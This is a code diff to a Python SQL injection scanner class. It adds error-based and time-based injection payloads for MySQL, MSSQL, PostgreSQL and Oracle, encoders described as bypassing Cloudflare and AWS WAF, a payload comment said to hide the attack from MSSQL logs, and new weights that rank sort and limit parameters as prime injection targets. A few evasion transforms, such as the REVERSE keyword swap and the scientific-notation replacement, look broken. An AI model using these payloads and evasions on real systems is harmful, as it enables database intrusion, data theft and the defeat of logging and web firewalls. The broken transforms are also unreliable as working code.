@@ -184,6 +184,19 @@ class SQLiScanner:
             "' AND 1=(SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))-- -",
             # Integer subquery
             " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+            # ── MySQL 8.x modern payloads ──
+            # GTID_SUBSET (MySQL 5.7.5+)
+            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1337)-- -",
+            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1337)-- -",
+            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1337)-- -",
+            # UUID_TO_BIN (MySQL 8.0+)
+            "' AND UUID_TO_BIN(version())='1'-- -",
+            # ROW() subquery error (compact, works on 5.5+)
+            "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- -",
+            # Double query via JSON
+            "' AND (SELECT JSON_KEYS((SELECT CONCAT('[',database(),']'))))-- -",
+            # JSON_OBJECTAGG (MySQL 8.0+)
+            "' AND JSON_OBJECTAGG(version(),1)-- -",
         ],
         "mssql": [
             "' AND 1=CONVERT(int,(SELECT @@version))-- -",
@@ -200,6 +213,17 @@ class SQLiScanner:
             " AND 1=CONVERT(int,@@version)-- -",
             # Stacked query error disclosure
             "'; SELECT 1/0-- -",
+            # ── MSSQL 2019+ modern payloads ──
+            # IN clause error
+            "' AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~'))-- -",
+            # String concat error
+            "' + CONVERT(int,@@version) + '",
+            # CAST variant
+            "' AND CAST((SELECT @@version) AS INT)=1337-- -",
+            # WHERE clause
+            "' AND (SELECT 1 WHERE 1=CONVERT(INT,(SELECT @@version)))--",
+            # sp_password (hides from MSSQL logs)
+            "' AND 1=CONVERT(int,@@version)--sp_password",
         ],
         "postgresql": [
             "' AND 1=CAST((SELECT version()) AS int)-- -",
@@ -214,6 +238,15 @@ class SQLiScanner:
             " AND 1=CAST(version() AS int)-- -",
             # Generate series
             "' AND 1=CAST((SELECT current_setting('server_version')) AS int)-- -",
+            # ── PostgreSQL 14+ modern payloads ──
+            # CAST with concat
+            "' AND 1337=CAST(CHR(126)||version()||CHR(126) AS NUMERIC)-- -",
+            # Database name via CAST
+            "' AND 1=CAST((SELECT concat('DB:',current_database())) AS int) AND '1'='1",
+            # ::int shorthand
+            "' AND (SELECT version())::int=1-- -",
+            # query_to_xml full dump
+            "' AND 1=CAST((SELECT query_to_xml('SELECT current_user',true,true,'')) AS int)-- -",
         ],
         "oracle": [
             "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
@@ -293,6 +326,11 @@ class SQLiScanner:
             "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -",
             # Conditional heavy query
             "' AND IF(1=1,(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B),0)-- -",
+            # IF-based SLEEP (bypasses simple SLEEP() regex)
+            "' OR IF(1=1,SLEEP({delay}),0)-- -",
+            "' AND (SELECT*FROM(SELECT SLEEP({delay}))a)='1",
+            # BENCHMARK alternative
+            "' AND (SELECT BENCHMARK(10000000,MD5(NOW())))-- -",
         ],
         "mssql": [
             "'; WAITFOR DELAY '0:0:{delay}'-- -",
@@ -301,6 +339,9 @@ class SQLiScanner:
             "'; IF(1=1) WAITFOR DELAY '0:0:{delay}'-- -",
             # Heavy query
             "' AND (SELECT COUNT(*) FROM sysusers AS a CROSS JOIN sysusers AS b CROSS JOIN sysusers AS c)>0-- -",
+            # Conditional WAITFOR variants
+            "'); WAITFOR DELAY '0:0:{delay}'-- -",
+            "')); WAITFOR DELAY '0:0:{delay}'-- -",
         ],
         "postgresql": [
             "'; SELECT pg_sleep({delay})-- -",
@@ -309,6 +350,10 @@ class SQLiScanner:
             "' AND (CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END) IS NOT NULL-- -",
             # Heavy query
             "' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0-- -",
+            # OR-based pg_sleep
+            "' OR pg_sleep({delay}) IS NOT NULL-- -",
+            # Stacked
+            "'; SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END-- -",
         ],
         "oracle": [
             "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -",
@@ -316,6 +361,8 @@ class SQLiScanner:
             "' AND 1=DBMS_LOCK.SLEEP({delay})-- -",
             # Heavy query
             "' AND (SELECT COUNT(*) FROM all_objects A, all_objects B)>0-- -",
+            # Conditional
+            "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END FROM dual) IS NOT NULL-- -",
         ],
         "sqlite": [
             # SQLite has no SLEEP — use LIKE on large ZEROBLOB or RANDOMBLOB
@@ -356,6 +403,22 @@ class SQLiScanner:
                 lambda m: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group()[:-1])) + '(',
                 p, flags=re.I),
             flags=re.I),
+        # ── 2025 Modern evasion techniques ──
+        # JSON function wrapper (bypasses most WAFs that don't inspect JSON SQL syntax)
+        "json_wrapper": lambda p: re.sub(
+            r"(UNION\s+SELECT)",
+            lambda m: f"JSON_LENGTH('{{}}') AND {m.group()}",
+            p, flags=re.I) if "UNION" in p.upper() else p,
+        # Scientific notation (bypasses AWS WAF signature detection)
+        "scientific_notation": lambda p: p.replace(" ", " 1.e(1) ").replace("=", " 1.e(1) ="),
+        # Vertical tab (%0b) as whitespace
+        "vertical_tab": lambda p: p.replace(" ", "%0b"),
+        # Form feed (%0c) as whitespace
+        "form_feed": lambda p: p.replace(" ", "%0c"),
+        # CRLF whitespace
+        "crlf_space": lambda p: p.replace(" ", "%0d%0a"),
+        # Reverse + concat obfuscation
+        "reverse_keyword": lambda p: p.replace("UNION SELECT", "REVERSE('TCELES') REVERSE('NOINU')") if "UNION" in p.upper() else p,
     }
 
     # ── Smart parameter prioritization ──
@@ -372,11 +435,15 @@ class SQLiScanner:
         "name": 6, "username": 6, "user": 6, "email": 6,
         "file": 5, "path": 5, "url": 5, "redirect": 5,
         "type": 5, "view": 5, "show": 5, "display": 5,
+        # ORDER BY / LIMIT params — HIGH value (often unquoted in SQL, very injectable)
+        "sort": 8, "order": 8, "orderby": 8, "sortby": 8, "order_by": 8,
+        "sort_by": 8, "dir": 7, "direction": 7, "column": 7, "col": 7,
+        "field": 7, "sortfield": 7, "limit": 8, "offset": 8, "per_page": 6,
+        "filter": 7, "where": 8, "having": 8, "group": 7,
         # Low-value (rarely injectable): score 2
         "lang": 2, "language": 2, "locale": 2, "theme": 2,
         "template": 2, "style": 2, "color": 2, "size": 2,
-        "sort": 2, "order": 2, "dir": 2, "limit": 2,
-        "offset": 2, "per_page": 2, "format": 2, "callback": 2,
+        "format": 2, "callback": 2,
         "utm_source": 1, "utm_medium": 1, "utm_campaign": 1,
         "ref": 1, "source": 1, "fbclid": 1, "gclid": 1,
     }
@@ -389,6 +456,10 @@ class SQLiScanner:
                 lambda p: p.replace(" ", "%09"),  # Tab instead of space
                 lambda p: p.replace("'", "%EF%BC%87"),  # Fullwidth apostrophe
                 lambda p: re.sub(r'UNION\s+SELECT', 'UNION%23%0ASELECT', p, flags=re.I),
+                # JSON function wrapper (Cloudflare doesn't inspect JSON SQL)
+                lambda p: re.sub(r"(UNION\s+(ALL\s+)?SELECT)", lambda m: f"JSON_LENGTH('{{}}') AND {m.group()}", p, flags=re.I) if "UNION" in p.upper() else p,
+                # Form feed whitespace
+                lambda p: p.replace(" ", "%0c"),
             ],
             "techniques": ["time", "boolean"],  # Prefer blind techniques
         },
@@ -428,6 +499,9 @@ class SQLiScanner:
             "encodings": [
                 lambda p: p.replace("UNION", "UNION%23%0a").replace("SELECT", "SELECT%23%0a"),
                 lambda p: p.replace(" ", "%0c"),  # Form feed
+                # Scientific notation bypass (AWS WAF specific)
+                lambda p: p.replace(" ", " 1.e(1) "),
+                lambda p: p.replace("UNION", "1.e(UNION)").replace("SELECT", "1.e(SELECT)") if "UNION" in p.upper() else p,
             ],
             "techniques": ["time", "boolean"],
         },
